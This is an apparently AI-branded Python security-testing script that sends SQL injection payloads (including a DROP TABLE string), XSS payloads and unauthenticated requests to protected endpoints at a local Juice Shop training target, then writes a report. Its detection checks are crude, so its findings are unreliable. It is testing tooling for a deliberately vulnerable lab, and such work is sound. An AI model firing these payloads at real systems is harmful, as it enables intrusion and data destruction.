#!/usr/bin/env python3
"""
AIVA AI 實戰安全測試腳本
對 Juice Shop 靶場進行真實的 AI 驅動安全測試
"""

import sys
import os
import asyncio
import json
import time
import requests
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any

# 確保路徑正確
sys.path.insert(0, str(Path(__file__).parent))

class AISecurityTester:
    """AI 安全測試主類"""
    
    def __init__(self):
        self.target_url = "http://localhost:3000"
        self.results = []
        self.ai_commander = None
        
    async def initialize_ai_systems(self):
        """初始化 AI 系統"""
        print('🤖 初始化 AI 系統...')
        
        try:
            from services.core.aiva_core.ai_commander import AICommander
            self.ai_commander = AICommander()
            print('✅ AI 指揮官初始化成功')
            
            # 初始化檢測模組
            from services.features.function_sqli import SmartDetectionManager
            self.sqli_detector = SmartDetectionManager()
            print('✅ SQL 注入檢測器初始化成功')
            
            return True
            
        except Exception as e:
            print(f'❌ AI 系統初始化失敗: {e}')
            return False
    
    def test_target_availability(self):
        """測試目標靶場可用性"""
        print('🎯 檢查靶場可用性...')
        
        try:
            response = requests.get(self.target_url, timeout=10)
            if response.status_code == 200:
                print(f'✅ Juice Shop 靶場可用 ({self.target_url})')
                return True
            else:
                print(f'⚠️ 靶場回應異常: {response.status_code}')
                return False
        except Exception as e:
            print(f'❌ 靶場連接失敗: {e}')
            return False
    
    async def run_sql_injection_tests(self):
        """執行 SQL 注入測試"""
        print('💉 執行 SQL 注入 AI 檢測...')
        
        # SQL 注入測試載荷
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT NULL, NULL, NULL --",
            "'; DROP TABLE users; --",
            "' OR SLEEP(5) --",
            "admin'--",
            "' OR 'x'='x",
            "1' AND SLEEP(5)#"
        ]
        
        test_results = []
        
        for i, payload in enumerate(sqli_payloads, 1):
            print(f'   🔍 測試載荷 {i}/{len(sqli_payloads)}: {payload[:30]}...')
            
            try:
                # 模擬登入測試
                login_data = {
                    'email': payload,
                    'password': 'test'
                }
                
                response = requests.post(
                    f'{self.target_url}/rest/user/login',
                    json=login_data,
                    timeout=10
                )
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_time': response.elapsed.total_seconds(),
                    'response_length': len(response.text),
                    'detected_vulnerability': self._analyze_sql_response(response)
                }
                
                test_results.append(result)
                
                if result['detected_vulnerability']:
                    print(f'   🚨 檢測到 SQL 注入漏洞！')
                else:
                    print(f'   ✅ 無漏洞檢出')
                
                # 防止過快請求
                await asyncio.sleep(0.5)
                
            except Exception as e:
                print(f'   ❌ 測試失敗: {e}')
                
        return test_results
    
    def _analyze_sql_response(self, response):
        """分析 SQL 注入回應"""
        # 簡單的檢測邏輯
        suspicious_patterns = [
            'error in your sql syntax',
            'mysql_fetch_array',
            'ora-01756',
            'microsoft jet database',
            'access database engine',
            'sqlite_master',
            'postgresql'
        ]
        
        response_text = response.text.lower()
        
        # 檢查異常狀態碼
        if response.status_code == 500:
            return True
            
        # 檢查錯誤訊息
        for pattern in suspicious_patterns:
            if pattern in response_text:
                return True
                
        # 檢查異常響應時間
        if response.elapsed.total_seconds() > 3:
            return True
            
        return False
    
    async def run_xss_tests(self):
        """執行 XSS 測試"""
        print('🔥 執行 XSS AI 檢測...')
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ]
        
        test_results = []
        
        for i, payload in enumerate(xss_payloads, 1):
            print(f'   🔍 測試載荷 {i}/{len(xss_payloads)}: {payload[:30]}...')
            
            try:
                # 測試搜尋功能
                params = {'q': payload}
                response = requests.get(
                    f'{self.target_url}/rest/products/search',
                    params=params,
                    timeout=10
                )
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'reflected': payload in response.text,
                    'detected_vulnerability': payload in response.text
                }
                
                test_results.append(result)
                
                if result['detected_vulnerability']:
                    print(f'   🚨 檢測到 XSS 漏洞！')
                else:
                    print(f'   ✅ 無漏洞檢出')
                    
                await asyncio.sleep(0.5)
                
            except Exception as e:
                print(f'   ❌ 測試失敗: {e}')
                
        return test_results
    
    async def run_authentication_bypass_tests(self):
        """執行認證繞過測試"""
        print('🔓 執行認證繞過 AI 檢測...')
        
        # 嘗試訪問需要認證的端點
        protected_endpoints = [
            '/api/Users',
            '/rest/user/whoami',
            '/rest/user/change-password',
            '/api/Challenges',
            '/rest/admin/application-configuration'
        ]
        
        test_results = []
        
        for endpoint in protected_endpoints:
            print(f'   🔍 測試端點: {endpoint}')
            
            try:
                response = requests.get(
                    f'{self.target_url}{endpoint}',
                    timeout=10
                )
                
                result = {
                    'endpoint': endpoint,
                    'status_code': response.status_code,
                    'accessible': response.status_code == 200,
                    'authentication_bypassed': response.status_code != 401
                }
                
                test_results.append(result)
                
                if result['authentication_bypassed'] and response.status_code == 200:
                    print(f'   🚨 檢測到認證繞過漏洞！')
                else:
                    print(f'   ✅ 認證保護正常')
                    
                await asyncio.sleep(0.5)
                
            except Exception as e:
                print(f'   ❌ 測試失敗: {e}')
                
        return test_results
    
    async def run_comprehensive_security_test(self):
        """執行全面的安全測試"""
        print('🚀 開始 AIVA AI 實戰安全測試')
        print(f'⏰ 測試時間: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
        print(f'🎯 目標靶場: {self.target_url}')
        print('=' * 60)
        print()
        
        # 1. 檢查靶場可用性
        if not self.test_target_availability():
            print('❌ 靶場不可用，測試中止')
            return
        
        # 2. 初始化 AI 系統
        if not await self.initialize_ai_systems():
            print('❌ AI 系統初始化失敗，測試中止')
            return
        
        print()
        
        # 3. 執行各類安全測試
        all_results = {}
        
        # SQL 注入測試
        sqli_results = await self.run_sql_injection_tests()
        all_results['sql_injection'] = sqli_results
        print()
        
        # XSS 測試
        xss_results = await self.run_xss_tests()
        all_results['xss'] = xss_results
        print()
        
        # 認證繞過測試
        auth_results = await self.run_authentication_bypass_tests()
        all_results['authentication_bypass'] = auth_results
        print()
        
        # 4. 生成測試報告
        self.generate_security_report(all_results)
        
        return all_results
    
    def generate_security_report(self, results: Dict[str, List[Dict[str, Any]]]):
        """生成安全測試報告"""
        print('📊 生成安全測試報告')
        print('=' * 40)
        
        total_tests = 0
        vulnerabilities_found = 0
        
        for test_type, test_results in results.items():
            print(f'\n🔍 {test_type.upper()} 測試結果:')
            
            vulns_in_category = 0
            
            for result in test_results:
                total_tests += 1
                
                if test_type == 'sql_injection' and result.get('detected_vulnerability'):
                    vulnerabilities_found += 1
                    vulns_in_category += 1
                elif test_type == 'xss' and result.get('detected_vulnerability'):
                    vulnerabilities_found += 1
                    vulns_in_category += 1
                elif test_type == 'authentication_bypass' and result.get('authentication_bypassed') and result.get('accessible'):
                    vulnerabilities_found += 1
                    vulns_in_category += 1
            
            print(f'   測試數量: {len(test_results)}')
            print(f'   發現漏洞: {vulns_in_category}')
        
        print(f'\n📈 總測試統計:')
        print(f'   總測試數: {total_tests}')
        print(f'   發現漏洞: {vulnerabilities_found}')
        print(f'   安全等級: {"🔴 高風險" if vulnerabilities_found > 5 else "🟡 中風險" if vulnerabilities_found > 0 else "🟢 低風險"}')
        
        # 儲存詳細報告
        report_file = Path('logs/security_test_report.json')
        report_file.parent.mkdir(exist_ok=True)
        
        full_report = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'summary': {
                'total_tests': total_tests,
                'vulnerabilities_found': vulnerabilities_found
            },
            'detailed_results': results
        }
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(full_report, f, indent=2, ensure_ascii=False)
        
        print(f'\n📁 詳細報告已儲存至: {report_file}')
        print('\n🔥 AIVA AI 實戰安全測試完成！')

async def main():
    """主要執行函式"""
    tester = AISecurityTester()
    await tester.run_comprehensive_security_test()

if __name__ == "__main__":
    asyncio.run(main())